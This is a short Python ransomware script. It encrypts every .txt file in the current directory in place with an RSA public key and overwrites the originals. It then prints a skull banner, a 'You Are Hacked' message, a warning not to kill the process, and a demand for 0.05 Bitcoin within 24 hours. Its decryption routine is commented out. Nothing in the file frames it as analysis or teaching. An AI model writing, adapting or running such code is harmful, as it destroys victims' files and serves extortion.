import os
import base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend 
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

files = os.listdir()

def encrypt(plaintext):
    with open("public_key.pem", "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )
    encrypted = base64.b64encode(public_key.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    ))
    return encrypted

def encryption():
    for file in files:
        if file.endswith(".txt"):
            f = open(file,"rb")
            plaintext = f.read()
            f = open(file,"wb")
            encrypted_txt = encrypt(plaintext)
            f.write(encrypted_txt)

skull = '''
                     ______
                  .-"      "-.
                 /            \\
                |              |
                |,  .-.  .-.  ,|
           /\   | )(__/  \__)( |
         _ \/   |/     /\     \|
        \_\/    (_     ^^     _)   .-==/~\\
       ___/_,__,_\__|IIIIII|__/__)/   /{~}}
       ---,---,---|-\IIIIII/-|---,\'-' {{~}
                  \          /     '-==\}/
                   `--------`
'''
try: 
    encryption()
    print(skull)
    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
    print("\n You Are Hacked \n")
    print("\n Don't Kill The Process You Will Not be Able to Recover Data\n")
    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n")
    # try:
    print("Pay 0.05 Bitcoin to address xxx in 24 hours else your files will be gone forever.\n")
    print("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
        # userInput = input()
        # while userInput.lower() == "no":
        #     userInput = input()
        # decryption()
    # except Exception as e:
    #     print("Decryption Failed")

except Exception as e:
    print("Encryption Failed")
    print("Damn Failed Attempt")